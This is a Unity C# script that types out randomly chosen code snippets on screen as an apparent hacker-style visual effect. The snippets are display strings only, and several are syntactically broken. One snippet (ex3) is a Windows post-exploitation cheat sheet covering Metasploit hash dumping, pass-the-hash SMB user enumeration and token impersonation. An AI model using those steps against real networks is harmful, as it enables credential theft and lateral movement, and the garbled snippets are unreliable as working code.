using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;

public class ScreenText : MonoBehaviour
{
    public float delay = 0.0f;
    private string currentText = "";
    private int random;
    private string code = "";
    private string ex1 = "from twisted.internet import reactor\nfrom twisted.internet.protocol import Protocol, ClientFactory\nclass SimpleClient(Protocol):\ndef connectionMade(self):\ndef dataReceived(self, data):\nprint 'Server Said: ', data\nself.transport.loseConnection()\ndef connectionLost(self, reason):\nprint 'Connection Lost %s ' %(reason)\nclass SimpleClientFactory(ClientFactory):\n protocol = SimpleClient\ndef clientConnectionFailed(self, connector, reason) :\nprint 'Connection Failed!!'\n reactor.stop()\nreactor.stop()\nreactor.connectTCP('localhost', 8000, SimpleClientFactory())\nreactor.run()";
    private string ex2 = "CComPtr<IDISPATCH> spDisp;\nHRESULT hr = m_pWebBrowser2->get_Document(&spDisp);\nif (SUCCEEDED(hr) && spDisp)\n{\nCComQIPtr<IHTMLDOCUMENT2 &IID_IHTMLDocument2> spHTML(spDisp);\nif (spHTML){\nEnumFrames(spHTML);\n}\nvoid CIeLoginHelper::EnumFrames(CComPtr<IHTMLDocument2>& spDocument)\n{\nCComPtr<IIHTMLDocument2> spDocument2;\nCComPtr<IIOleContainer> pContainer;\nHRESULT hr = spDocument->QueryInterface(IID_IOleContainer,(void**)&pContainer);\n} ";
    private string ex3 = "[+] After compromising a Windows machine:\n[>] List the domain administrators:\nFrom Shell - net group 'Domain Admins' /domain\n[>] Dump the hashes(Metasploit)\nmsf > run post/windows/gather/smart_hashdump GETSYSTEM = FALSE\n[>] Find the admins(Metasploit)\nspool /tmp/enumdomainusers.txt\nmsf > use auxiliary/scanner/smb/smb_enumusers_domain\nmsf > set smbuser Administrator\nmsf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nmsf > set rhosts 10.10.10.0/24\nmsf > set threads 8\nmsf > run\nmsf> spool off\n[>] Compromise Admin's box\nmeterpreter > load incognito\nmeterpreter > list_tokens -u";
    private string ex4 = "from pydbg import *\nfrom pydbg.defines import*\ndbg = pydbg()\ndbg.attach(1884)\ndef detect_overflow(dbg):\n   if dbg.dbg.u.Exception.dwFirstChance:\n        return DBG_EXCEPTION_NOT_HANDLED\n    print 'Access Violation Happened!!'\n    print 'EIP %0x' %dbg.context.Eip\n    return DBG_EXCEPTION_NOT_HANDLED\ndbg.set_callback(EXCEPTION_ACCESS_VIOLATION, detect_overflow)\ndbg.run()";
    private string ex5 = "from pysnmp.entity.rfc3413.oneliner import cmdgen\nsnmpCmdGen = cmdgen.CommandGenerator()\nsnmpTransportData = cmdgen.UdpTransportTarget(('localhost', 161))\nmib = cmdgen.MibVariable('SNMPv2-MIB', 'sysName', 0)\nerror, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData('public'), snmpTransportData, mib)\nif error:\n    print 'Error '+error\nelse:\n    if errorStatus:\n        print('%s at %s' % (\n            errorStatus.prettyPrint(),\n            errorIndex and binds[int(errorIndex) - 1] or '?'\n            )\n        )\n    else:\n        for name, val in binds:\n            print('%s = %s' % (name.prettyPrint(), val.prettyPrint()))";
    private string ex6 = "from twisted.internet import reactor\nfrom twisted.web import proxy, server\n\nsite = server.Site(proxy.ReverseProxyResource('www.thehackerway.com', 80, ''))\nreactor.listenTCP(8080, site)\nreactor.run()";
    private string ex7 = "from subprocess import Popen, PIPE\nfor ip in range(1,40) :\n    ipAddress = '192.168.1.'+str(ip)\n    print 'Scanning %s ' %(ipAddress)\n    subprocess = Popen(['/bin/ping', '-c 1 ', ipAddress], stdin = PIPE, stdout = PIPE, stderr = PIPE)\n    stdout, stderr= subprocess.communicate(input=None)\n	if 'bytes from ' in stdout:\n        print 'The Ip Address %s has responded with a ECHO_REPLY!' %(stdout.split()[1])\n		with open('ips.txt', 'a') as myfile:\n			myfile.write(stdout.split()[1]+'\n')";
    private string ex8 = "import paramiko\nfrom paramiko import RSAKey\nimport threading\nimport socket\ndef handleTcpSocket(chan, host, port):\n    sock = socket.socket()\n	try:\n        sock.connect((host, port))\n    except Exception, e:\n        print('Forwarding request to %s:%d failed: %r' % (host, port, e))\n		return\n	#print('Connected!  Tunnel open %r -> %r -> %r' % (chan.origin_addr, chan.getpeername(), (host, port)))\n	while True:\n        r, w, x = select.select([sock, chan], [], [])\n		if sock in r:\n            data = sock.recv(1024)\n			if len(data) == 0:\n				break";
    private string ex9 = "__VERSION__ = '1.0'\nimport immlib\nfrom immlib import AllExceptHook\nDESC = 'Simple PyHook' \nclass DemoHook(AllExceptHook): \n    def __init__(self):\n    AllExceptHook.__init__(self)\n    def run(self, regs) :\n    imm = immlib.Debugger()\n	for key in regs.keys():\n        reg = regs[key]\n        imm.log('REGISTER %s at 0x%08X ' %(key, reg))\ndef main(args):\n    imm = immlib.Debugger()\n    newHook = DemoHook()\n    newHook.add('Demo Hook') \n    return 'Success!' ";
    private string ex10 = "final class PositionExpression extends Expression {\n  public function __construct(private int $position) {\n    $this->type = TokenType::IDENTIFIER;\n    $this->precedence = 0;\n    $this->name = (string)$position;\n  }\n  << __Override>>\n  public function evaluateImpl(row $row, AsyncMysqlConnection $_conn): mixed {\n    if (C\first($row) is dict<_, _>) {\n      $row = C\firstx($row) as dict<_, _>;\n    }\n    $row = vec($row);\n    if (!Ccontains_key($row, $this->position - 1)) {\n      throw new SQLFakeRuntimeException('Undefined positional reference {$this->position} IN GROUP BY or ORDER BY');\n    }\n    return $row[$this->position - 1];\n  }";
    int aux1 = 0;

    private void Start()
    {
        randomString();
    }
    IEnumerator showText()
    {
        int i;
        for ( i = aux1 +1; i<code.Length +1; i++)
        {
                currentText = code.Substring(0, i);
                this.GetComponent<Text>().text = currentText;
                yield return new WaitForSeconds(delay);
                aux1++;
            break;
        }
        if (i == code.Length + 1)
        {
            randomString();
            currentText = "";
            aux1 = 0;
            print("se ejecuta");
        }
    }
    
    public void showTextButton()
    {
                
            StartCoroutine(showText()); 
        

     
    }

    private void randomString()
    {
        random = Random.Range(1, 11);

        switch (random)
        {
            case 1:
                code = ex1;
                break;
            case 2:
                code = ex2;
                break;
            case 3:
                code = ex3;
                break;
            case 4:
                code = ex4;
                break;
            case 5:
                code = ex5;
                break;
            case 6:
                code = ex6;
                break;
            case 7:
                code = ex7;
                break;
            case 8:
                code = ex8;
                break;
            case 9:
                code = ex9;
                break;
            case 10:
                code = ex10;
                break;
        }
    }
}
